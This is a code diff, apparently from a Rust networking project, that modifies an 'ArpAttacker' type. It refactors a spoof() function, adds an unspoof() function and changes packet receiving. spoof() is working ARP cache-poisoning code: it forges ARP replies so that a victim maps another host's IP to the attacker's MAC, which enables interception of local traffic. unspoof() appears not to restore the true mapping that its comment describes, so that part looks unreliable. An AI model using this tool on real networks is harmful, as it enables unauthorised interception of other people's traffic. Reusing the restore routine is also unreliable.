@@ -9,21 +9,11 @@ use pnet::{
             ArpHardwareTypes::{self},
             ArpOperations, ArpPacket, MutableArpPacket,
         },
-        ethernet::{EtherTypes, MutableEthernetPacket},
+        ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket},
         Packet,
     },
     util::MacAddr,
 };
-
-pub struct Addrs {
-    pub ip: Ipv4Addr,
-    pub mac: MacAddr,
-}
-impl Addrs {
-    pub fn new(ip: Ipv4Addr, mac: MacAddr) -> Self {
-        Self { ip, mac }
-    }
-}
 
 pub struct ArpAttacker {
     tx: Box<dyn DataLinkSender>,
@@ -47,7 +37,7 @@ impl ArpAttacker {
         let mac = iface
             .mac
             .ok_or(anyhow!("didn't find a mac address on interface"))?;
-        match datalink::channel(&iface, Default::default()) {
+        match datalink::channel(iface, Default::default()) {
             Ok(Channel::Ethernet(tx, rx)) => Ok(Self {
                 tx,
                 rx,
@@ -60,39 +50,78 @@ impl ArpAttacker {
         }
     }
 
+    /// poison the arp cache of source
+    /// source: victim
+    /// target: target of the victim to spoof
     pub fn spoof(
         &mut self,
         source: (Ipv4Addr, MacAddr),
         target: (Ipv4Addr, MacAddr),
     ) -> Result<()> {
-        let buffer = &mut [0u8; 42];
-        let mut packet = MutableEthernetPacket::new(buffer)
+        let mut eth_buffer = [0u8; 42];
+        let mut eth_packet = MutableEthernetPacket::new(&mut eth_buffer)
             .ok_or(anyhow!("MutableEthernetPacket returned None"))?;
-        packet.set_source(self.mac);
-        packet.set_destination(target.1);
-        packet.set_ethertype(EtherTypes::Arp);
-        let msg: ArpPacket = {
-            let mut arp_buf = [0u8; 28];
-            let mut arp_pkt = MutableArpPacket::new(arp_buf.as_mut_slice())
-                .ok_or(anyhow!("MutableArpPacket returned None"))?;
-            arp_pkt.set_hardware_type(ArpHardwareTypes::Ethernet);
-            arp_pkt.set_protocol_type(EtherTypes::Ipv4);
-            arp_pkt.set_hw_addr_len(6);
-            arp_pkt.set_proto_addr_len(4);
-            arp_pkt.set_sender_hw_addr(self.mac);
-            arp_pkt.set_target_hw_addr(source.1);
-            arp_pkt.set_sender_proto_addr(target.0);
-            arp_pkt.set_target_proto_addr(source.0);
-            arp_pkt.set_operation(ArpOperations::Reply);
-            let packet = ArpPacket::new(arp_pkt.packet()).unwrap();
-            packet
-        };
-        packet.set_payload(msg.packet());
-        self.tx.send_to(packet.packet(), Some(self.iface.clone()));
+        eth_packet.set_source(self.mac);
+        eth_packet.set_destination(target.1);
+        eth_packet.set_ethertype(EtherTypes::Arp);
+        let mut arp_buffer = [0u8; 28];
+        let mut mut_arp_packet = MutableArpPacket::new(&mut arp_buffer)
+            .ok_or(anyhow!("MutableArpPacket returned None"))?;
+        mut_arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
+        mut_arp_packet.set_protocol_type(EtherTypes::Ipv4);
+        mut_arp_packet.set_hw_addr_len(6);
+        mut_arp_packet.set_proto_addr_len(4);
+        mut_arp_packet.set_sender_hw_addr(self.mac);
+        mut_arp_packet.set_target_hw_addr(source.1);
+        mut_arp_packet.set_sender_proto_addr(target.0);
+        mut_arp_packet.set_target_proto_addr(source.0);
+        mut_arp_packet.set_operation(ArpOperations::Reply);
+        let arp_packet =
+            ArpPacket::new(mut_arp_packet.packet()).ok_or(anyhow!("ArpPacket returned None"))?;
+        eth_packet.set_payload(arp_packet.packet());
+        self.tx
+            .send_to(eth_packet.packet(), Some(self.iface.clone()));
         Ok(())
     }
 
-    pub fn recv(&mut self) -> Result<&[u8]> {
-        Ok(self.rx.next()?)
+    /// Unpoison the arp cache of source
+    /// source: victim
+    /// target: target of the victim to spoof
+    pub fn unspoof(
+        &mut self,
+        source: (Ipv4Addr, MacAddr),
+        target: (Ipv4Addr, MacAddr),
+    ) -> Result<()> {
+        let mut eth_buffer = [0u8; 42];
+        let mut eth_packet = MutableEthernetPacket::new(&mut eth_buffer)
+            .ok_or(anyhow!("MutableEthernetPacket returned None"))?;
+        eth_packet.set_source(self.mac);
+        eth_packet.set_destination(source.1);
+        eth_packet.set_ethertype(EtherTypes::Arp);
+        let mut arp_buffer = [0u8; 28];
+        let mut mut_arp_packet = MutableArpPacket::new(&mut arp_buffer)
+            .ok_or(anyhow!("MutableArpPacket returned None"))?;
+        mut_arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
+        mut_arp_packet.set_protocol_type(EtherTypes::Ipv4);
+        mut_arp_packet.set_hw_addr_len(6);
+        mut_arp_packet.set_proto_addr_len(4);
+        mut_arp_packet.set_sender_hw_addr(self.mac);
+        mut_arp_packet.set_target_hw_addr(target.1);
+        mut_arp_packet.set_sender_proto_addr(self.ip);
+        mut_arp_packet.set_target_proto_addr(target.0);
+        mut_arp_packet.set_operation(ArpOperations::Reply);
+        let arp_packet =
+            ArpPacket::new(mut_arp_packet.packet()).ok_or(anyhow!("ArpPacket returned None"))?;
+        eth_packet.set_payload(arp_packet.packet());
+        self.tx
+            .send_to(eth_packet.packet(), Some(self.iface.clone()));
+        Ok(())
+    }
+
+    pub fn recv(&mut self) -> Result<EthernetPacket> {
+        let buffer = self.rx.next()?.to_owned();
+        let p: EthernetPacket = EthernetPacket::owned(buffer)
+            .ok_or(anyhow!("failed to parse ethernet packet from raw data"))?;
+        Ok(p)
     }
 }
